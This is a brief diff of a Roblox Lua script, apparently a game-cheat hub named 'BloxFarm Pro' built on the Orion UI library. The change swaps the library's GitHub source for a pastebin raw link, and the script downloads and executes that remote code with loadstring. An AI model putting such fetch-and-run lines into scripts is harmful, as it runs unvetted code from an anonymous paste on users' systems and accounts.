@@ -1,5 +1,5 @@
 -- OrionLibロード
-local OrionLib = loadstring(game:HttpGet("https://raw.githubusercontent.com/shlexware/Orion/main/source"))()
+local OrionLib = loadstring(game:HttpGet("https://pastebin.com/raw/WRUyYTdY"))()
 local Window = OrionLib:MakeWindow({Name = "BloxFarm Pro", HidePremium = false, SaveConfig = true, ConfigFolder = "OrionTest"})
 
 -- グローバル設定
